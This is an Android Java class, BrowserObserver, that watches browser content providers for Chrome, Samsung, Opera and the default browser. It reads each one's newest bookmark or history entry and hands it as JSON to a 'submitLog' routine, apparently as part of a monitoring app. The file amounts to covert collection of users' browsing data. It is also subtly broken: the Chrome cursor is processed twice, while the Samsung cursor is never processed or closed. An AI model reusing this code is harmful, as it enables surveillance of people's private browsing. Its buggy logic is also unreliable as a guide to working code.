package the5concurrentnodes.mmaData.Browser;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;

public class BrowserObserver extends ContentObserver {
    private Context context;
    private BrowserHandler browserHandler;

    public BrowserObserver (Context context)
    {
        super(null);
        this.context = context;
        this.browserHandler= new BrowserHandler();
    }
    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);

        Cursor chromeCursor = context.getContentResolver().query(Uri.parse(BrowserConstants.CHROME_CONTENT_CALL_URI)
                , null, null, null, "_id DESC");
        Cursor samsungCursor = context.getContentResolver().query(Uri.parse(BrowserConstants.SAMSUNG_CONTENT_CALL_URI)
                , null, null, null, "_id DESC");
        Cursor Operacursor = context.getContentResolver().query(Uri.parse(BrowserConstants.OPERA_CONTENT_CALL_URI)
                , null, null, null, "_id DESC");
        Cursor cursor = context.getContentResolver().query(Uri.parse(BrowserConstants.CONTENT_CALL_URI)
                , null, null, null, "_id DESC");

        handleBrowserInformation(chromeCursor);
        handleBrowserInformation(chromeCursor);
        handleBrowserInformation(Operacursor);
        handleBrowserInformation(cursor);

    }

    public void handleBrowserInformation (Cursor _cusor) {
        if (_cusor != null) {

            _cusor.moveToFirst();
            Browser browser = browserHandler.getBrowserInformation(_cusor);

            if (Integer.parseInt(browser.getType()) == BrowserConstants.BROWSER_URL_BOOKMARK ||
                    Integer.parseInt(browser.getType()) == BrowserConstants.BROWSER_URL_HISTORY) {

                if (Integer.parseInt(browser.getType()) == BrowserConstants.BROWSER_URL_BOOKMARK) {

                    browser.setType("Bookmark");

                } else {

                    browser.setType("History");
                }

                browserHandler.submitLog(context, browser.toJSONObject());
            }

            if (!_cusor.isClosed())
                _cusor.close();
        }
    }

    @Override
    public boolean deliverSelfNotifications(){ return  false;}
}

